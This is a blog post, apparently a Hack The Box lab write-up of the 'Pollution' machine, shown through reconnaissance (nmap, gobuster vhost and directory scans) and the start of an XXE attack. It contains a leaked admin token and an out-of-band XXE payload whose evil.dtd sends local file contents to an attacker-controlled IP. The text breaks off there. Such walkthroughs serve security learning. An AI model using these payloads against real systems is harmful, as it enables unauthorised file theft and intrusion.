<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Pollution" /><meta name="author" content="Derrick Tran" /><meta property="og:locale" content="en" /><meta name="description" content="I’m not good at CSS." /><meta property="og:description" content="I’m not good at CSS." /><link rel="canonical" href="https://dumosuku.com/posts/Pollution/" /><meta property="og:url" content="https://dumosuku.com/posts/Pollution/" /><meta property="og:site_name" content="Dumosuku" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-14T00:00:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Pollution" /><meta name="twitter:site" content="@igota7onmyessay" /><meta name="twitter:creator" content="@<twitter_of_author>" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Derrick Tran","url":"https://tranderrick1.github.io/"},"dateModified":"2023-04-20T01:26:22-07:00","datePublished":"2023-03-14T00:00:00-07:00","description":"I’m not good at CSS.","headline":"Pollution","mainEntityOfPage":{"@type":"WebPage","@id":"https://dumosuku.com/posts/Pollution/"},"url":"https://dumosuku.com/posts/Pollution/"}</script><title>Pollution | Dumosuku</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Dumosuku"><meta name="application-name" content="Dumosuku"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/81609585?s=400&u=971df4833d71ea497fc033c322a7fd4a2e3a0179&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Dumosuku</a></div><div class="site-subtitle font-italic">Aspiring pentester from Cal Poly Pomona</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/dumosuku" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/igota7onmyessay" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['tranderrick1','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Pollution</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Pollution</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1678777200" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Mar 14, 2023 </em> </span> <span> Updated <em class="" data-ts="1681979182" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Apr 20, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://tranderrick1.github.io/">Derrick Tran</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4478 words"> <em>24 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://i.imgur.com/PrhY1LE.png" alt="" data-proofer-ignore></p><h1 id="preface">Preface</h1><p>I’m not an expert in any way shape or form. Fully expect that some of this information may be inaccurate. It was my first time leveraging many of these vulnerabilities so the explanations may not be accurate. Most of the results were interpreted by me from what I’ve read to the best of my ability. If you spot something that is off, please let me know and I’ll make the changes accordingly.</p><h1 id="overview">Overview</h1><p>Pollution is an awesome and difficult Linux box focusing around an interesting choice for a tech stack. A combination of a PHP site handled with PHP FPM and a NodeJS API says it all. This box had me going through all of my web knowledge in order to fully compromise the machine.</p><p>The box begins with fuzzing for subdomains. One of which contains a log with information on gaining a admin account on the initial website. Admins have access to an API endpoint vulnerable to XXE. Chain this with SSRF and you can gain access to local files through out of bands exfiltration. Snoop around and you eventually find the password to the other subdomain and a password to the Redis database. Adjust your own cookie handled by the database to bypass authentication to the third site. Use the LFI to RCE chain to gain our first shell. Exploit FastCGI on port 9000 and we are able to pivot to Victor. For the final stretch of the machine, perform prototype pollution on the API to gain a root shell.</p><h1 id="reconnaissance">Reconnaissance</h1><hr /><h2 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2023-03-08 13:37 EST</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="nx">collect</span><span class="p">.</span><span class="nx">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">11.192</span><span class="p">)</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.077</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span> <span class="nx">shown</span><span class="p">:</span> <span class="mi">65532</span> <span class="nx">closed</span> <span class="nx">tcp</span> <span class="nx">ports</span> <span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
<span class="nx">PORT</span>     <span class="nx">STATE</span> <span class="nx">SERVICE</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">ssh</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">http</span>
<span class="mi">6379</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">redis</span>

<span class="nx">Nmap</span> <span class="nx">done</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">host</span> <span class="nx">up</span><span class="p">)</span> <span class="nx">scanned</span> <span class="k">in</span> <span class="mf">13.64</span> <span class="nx">seconds</span>
</pre></table></code></div></div><p>Initial scans from the outside reveal 2 typical ports seen with nearly any Linux web server: SSH and HTTP. Interestingly enough, this web application uses a Redis database which I don’t often see.</p><h2 id="http-site-80tcp"><span class="mr-2">HTTP Site (80/tcp)</span><a href="#http-site-80tcp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Looks like a custom web application capable of handling registering for an account and logging in. Mentions of an API so we may be abusing that later. Site also seems to have error handling in the form of redirecting back to the main page if attempting to pull a page that does not exist. Visiting admin page redirects as a result of either access controls or routing. Default admin credentials don’t work either.</p><p><img data-src="https://i.imgur.com/br2NuGn.png" alt="" data-proofer-ignore></p><h3 id="subdomains"><span class="mr-2">Subdomains</span><a href="#subdomains" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Command: <code class="language-plaintext highlighter-rouge">gobuster vhost -u http://collect.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain</code></p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="o">===============================================================</span>
<span class="nx">Gobuster</span> <span class="nx">v3</span><span class="p">.</span><span class="mf">2.0</span><span class="o">-</span><span class="nx">dev</span>
<span class="nx">by</span> <span class="nx">OJ</span> <span class="nx">Reeves</span> <span class="p">(@</span><span class="nd">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nx">Christian</span> <span class="nx">Mehlmauer</span> <span class="p">(@</span><span class="nd">firefart</span><span class="p">)</span>
<span class="o">===============================================================</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Url</span><span class="p">:</span>             <span class="nx">http</span><span class="p">:</span><span class="c1">//collect.htb/</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Method</span><span class="p">:</span>          <span class="nx">GET</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Threads</span><span class="p">:</span>         <span class="mi">10</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Wordlist</span><span class="p">:</span>        <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">seclists</span><span class="o">/</span><span class="nx">Discovery</span><span class="o">/</span><span class="nx">DNS</span><span class="o">/</span><span class="nx">subdomains</span><span class="o">-</span><span class="nx">top1million</span><span class="o">-</span><span class="mi">110000</span><span class="p">.</span><span class="nx">txt</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">User</span> <span class="nx">Agent</span><span class="p">:</span>      <span class="nx">gobuster</span><span class="o">/</span><span class="mf">3.2</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="nx">dev</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Timeout</span><span class="p">:</span>         <span class="mi">10</span><span class="nx">s</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Append</span> <span class="nx">Domain</span><span class="p">:</span>   <span class="kc">true</span>
<span class="o">===============================================================</span>
<span class="mi">2023</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">08</span> <span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">40</span> <span class="nx">Starting</span> <span class="nx">gobuster</span> <span class="k">in</span> <span class="nx">VHOST</span> <span class="nx">enumeration</span> <span class="nx">mode</span>
<span class="o">===============================================================</span>
<span class="nx">Found</span><span class="p">:</span> <span class="nx">forum</span><span class="p">.</span><span class="nx">collect</span><span class="p">.</span><span class="nx">htb</span> <span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">14102</span><span class="p">]</span>
<span class="nx">Found</span><span class="p">:</span> <span class="nx">developers</span><span class="p">.</span><span class="nx">collect</span><span class="p">.</span><span class="nx">htb</span> <span class="nx">Status</span><span class="p">:</span> <span class="mi">401</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">469</span><span class="p">]</span>
<span class="o">===============================================================</span>
<span class="mi">2023</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">08</span> <span class="mi">13</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">38</span> <span class="nx">Finished</span>
<span class="o">===============================================================</span>
</pre></table></code></div></div><h3 id="directories"><span class="mr-2">Directories</span><a href="#directories" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Command: <code class="language-plaintext highlighter-rouge">gobuster dir -u http://collect.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 50 -r --exclude-length 26197</code></p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="o">===============================================================</span>
<span class="nx">Gobuster</span> <span class="nx">v3</span><span class="p">.</span><span class="mf">2.0</span><span class="o">-</span><span class="nx">dev</span>
<span class="nx">by</span> <span class="nx">OJ</span> <span class="nx">Reeves</span> <span class="p">(@</span><span class="nd">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="nx">Christian</span> <span class="nx">Mehlmauer</span> <span class="p">(@</span><span class="nd">firefart</span><span class="p">)</span>
<span class="o">===============================================================</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Url</span><span class="p">:</span>                     <span class="nx">http</span><span class="p">:</span><span class="c1">//collect.htb/</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Method</span><span class="p">:</span>                  <span class="nx">GET</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Threads</span><span class="p">:</span>                 <span class="mi">50</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Wordlist</span><span class="p">:</span>                <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">seclists</span><span class="o">/</span><span class="nx">Discovery</span><span class="o">/</span><span class="nx">Web</span><span class="o">-</span><span class="nx">Content</span><span class="o">/</span><span class="nx">raft</span><span class="o">-</span><span class="nx">medium</span><span class="o">-</span><span class="nx">directories</span><span class="o">-</span><span class="nx">lowercase</span><span class="p">.</span><span class="nx">txt</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Negative</span> <span class="nx">Status</span> <span class="nx">codes</span><span class="p">:</span>   <span class="mi">404</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Exclude</span> <span class="nx">Length</span><span class="p">:</span>          <span class="mi">26197</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">User</span> <span class="nx">Agent</span><span class="p">:</span>              <span class="nx">gobuster</span><span class="o">/</span><span class="mf">3.2</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="nx">dev</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Follow</span> <span class="nx">Redirect</span><span class="p">:</span>         <span class="kc">true</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Timeout</span><span class="p">:</span>                 <span class="mi">10</span><span class="nx">s</span>
<span class="o">===============================================================</span>
<span class="mi">2023</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">08</span> <span class="mi">13</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">18</span> <span class="nx">Starting</span> <span class="nx">gobuster</span> <span class="k">in</span> <span class="nx">directory</span> <span class="nx">enumeration</span> <span class="nx">mode</span>
<span class="o">===============================================================</span>
<span class="sr">/register             </span><span class="se">(</span><span class="sr">Status: 200</span><span class="se">)</span><span class="sr"> </span><span class="se">[</span><span class="sr">Size: 4746</span><span class="err">]
</span><span class="o">/</span><span class="nx">login</span>                <span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">4740</span><span class="p">]</span>
<span class="o">/</span><span class="nx">admin</span>                <span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">4740</span><span class="p">]</span>
<span class="o">/</span><span class="nx">assets</span>               <span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">1500</span><span class="p">]</span>
<span class="o">/</span><span class="nx">api</span>                  <span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">4740</span><span class="p">]</span>
<span class="o">/</span><span class="nx">home</span>                 <span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">4740</span><span class="p">]</span>
<span class="o">/</span><span class="nx">server</span><span class="o">-</span><span class="nx">status</span>        <span class="p">(</span><span class="nx">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">)</span> <span class="p">[</span><span class="nx">Size</span><span class="p">:</span> <span class="mi">276</span><span class="p">]</span>
<span class="o">===============================================================</span>
<span class="mi">2023</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">08</span> <span class="mi">13</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">32</span> <span class="nx">Finished</span>
<span class="o">===============================================================</span>
</pre></table></code></div></div><ul><li><p>Note to self while enumerating websites</p><p><strong>Directories:</strong> When attempting to fuzz for directories on a website that redirects a lot, use the <code class="language-plaintext highlighter-rouge">-r</code> flag in <code class="language-plaintext highlighter-rouge">gobuster</code> and see where it goes to. Take that content length and exclude it with <code class="language-plaintext highlighter-rouge">--exclude-length</code> XXX characters.</p><p><strong>Vhosts</strong>: Not sure if this was a one off thing but I’ve been noticing that while debugging vhost fuzzing with <code class="language-plaintext highlighter-rouge">gobuster</code> they don’t append the rest of the domain. To get around this use the <code class="language-plaintext highlighter-rouge">--append-domain</code> flag and you will eventually find what you are looking for if it exists.</p></ul><h3 id="developers-site"><span class="mr-2">Developers site</span><a href="#developers-site" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>So far, I cannot access this site as it requires basic authentication. We may be able to get through if we can find credentials somewhere.</p><p><img data-src="https://i.imgur.com/LOAw9j7.png" alt="" data-proofer-ignore></p><h3 id="forum-site"><span class="mr-2">Forum site</span><a href="#forum-site" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Seems like a site for employees however it was publicly accessible. You can also sign up for an account here. One of the threads contains an interesting log file.</p><p><img data-src="https://i.imgur.com/MwnyJ9O.png" alt="" data-proofer-ignore></p><blockquote class="prompt-tip"><div><p>A admin token for the website!</p><p>token=ddac62a28254561001277727cb397baf</p></div></blockquote><p>This was located inside the attached log file. The token can be used to create admin users at <a href="http://collect.htb/set/role/admin"><code class="language-plaintext highlighter-rouge">http://collect.htb/set/role/admin</code></a>. All it needs to take is the PHPSESSID cookie so I can send in a POST request with my account’s cookie in order to turn it into an admin account.</p><h2 id="redis-database-6379tcp"><span class="mr-2">Redis Database (6379/tcp)</span><a href="#redis-database-6379tcp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://i.imgur.com/GgJJKiD.png" alt="" data-proofer-ignore></p><p>By the looks of it, can’t really access this database without valid credentials.</p><h1 id="initial-access-www-data">Initial Access: www-data</h1><hr /><h2 id="administrator-site"><span class="mr-2">Administrator site</span><a href="#administrator-site" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Seems like the API being mentioned earlier comes into play here. Here we can register for the API. Intercepting the post request of this form is pretty interesting.</p><p><img data-src="https://i.imgur.com/DkIfvPY.png" alt="" data-proofer-ignore></p><p>API POST Request example</p><p><img data-src="https://i.imgur.com/kFnFCTz.png" alt="" data-proofer-ignore></p><p>Interestingly enough, seems like the API takes in requests in the format of XML.</p><blockquote class="prompt-warning"><div><p>Vulnerability</p><p>The output is in XML which is commonly vulnerable to XXE</p></div></blockquote><h2 id="xxe--ssrf-out-of-bands-exfiltration"><span class="mr-2">XXE → SSRF Out of Bands Exfiltration</span><a href="#xxe--ssrf-out-of-bands-exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><div><p>First off, what is XXE?</p><p>XML External Entity or XXE for short is a type of vulnerability that occurs when an XML parser processes input containing a reference to an external entity hence the name. Generally speaking, XXE is used to disclose local files or at least, that is the extent to which I have been able to use it for in the past.</p></div></blockquote><p>While attempting basic XXE payloads from Hacktricks such as:</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">&lt;</span><span class="err">!--?</span><span class="na">xml</span> <span class="na">version</span><span class="p">=</span><span class="s">"1.0"</span> <span class="err">?--</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="err">!</span><span class="na">DOCTYPE</span> <span class="na">foo</span> <span class="err">[&lt;!</span><span class="na">ENTITY</span> <span class="na">example</span> <span class="na">SYSTEM</span> <span class="s">"/etc/passwd"</span><span class="p">&gt;</span> ]&gt;
<span class="p">&lt;</span><span class="nt">data</span><span class="p">&gt;</span><span class="ni">&amp;example;</span><span class="p">&lt;/</span><span class="nt">data</span><span class="p">&gt;</span>
</pre></table></code></div></div><p><img data-src="https://i.imgur.com/jHoMkkb.png" alt="" data-proofer-ignore></p><p>All I get is a fat error. This might be because the input I’m providing is a <code class="language-plaintext highlighter-rouge">&lt;data&gt;</code> tag and that the API is expecting certain data, but no matter how I adjust this or try to append this to a valid request, I only get failures. In retrospect for this type of payload, I believe data needs to be reflected somewhere in order to get the file’s contents to be outputted somewhere. When I get a valid request, all it says is a 200 okay.</p><p>Another XXE attack I can try is to chain it with server side request forgery (SSRF). Here’s the new payload I can try:</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="p">&lt;</span><span class="err">!</span><span class="na">ENTITY</span> <span class="err">%</span> <span class="na">file</span> <span class="na">SYSTEM</span> <span class="s">"index.php"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="err">!</span><span class="na">ENTITY</span> <span class="err">%</span> <span class="na">eval</span> <span class="s">"&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://10.10.14.137/?x=%file;'&gt;"</span><span class="p">&gt;</span>
%eval;
%exfiltrate;
</pre></table></code></div></div><p>This is going to be the contents of evil.dtd which will be requested in this kind of POST request for the manage_api argument.</p><div class="language-jsx highlighter-rouge"><div class="code-header"> <span data-label-text="Jsx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="p">&lt;</span><span class="err">?</span><span class="na">xml</span> <span class="na">version</span><span class="p">=</span><span class="s">"1.0"</span> <span class="na">encoding</span><span class="p">=</span><span class="s">"UTF-8"</span><span class="err">?</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="err">!</span><span class="na">DOCTYPE</span> <span class="na">foo</span> <span class="err">[&lt;!</span><span class="na">ENTITY</span> <span class="err">%</span> <span class="na">xxe</span> <span class="na">SYSTEM</span> <span class="s">"http://10.10.14.137/evil.dtd"</span><span class="p">&gt;</span> %xxe;]&gt;
<span class="p">&lt;</span><span class="nt">root</span><span class="p">&gt;</span>
	<span class="p">&lt;</span><span class="nt">method</span><span class="p">&gt;</span>POST<span class="p">&lt;/</span><span class="nt">method</span><span class="p">&gt;</span>
	<span class="p">&lt;</span><span class="nt">uri</span><span class="p">&gt;</span>/auth/register<span class="p">&lt;/</span><span class="nt">uri</span><span class="p">&gt;</span>
	<span class="p">&lt;</span><span class="nt">user</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">username</span><span class="p">&gt;</span>lmao<span class="p">&lt;/</span><span class="nt">username</span><span class="p">&gt;</span>
		<span class="p">&lt;</span><span class="nt">password</span><span class="p">&gt;</span>lmaoao<span class="p">&lt;/</span><span class="nt">password</span><span class="p">&gt;</span>
	<span class="p">&lt;/</span><span class="nt">user</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">root</span><span class="p">&gt;</span>
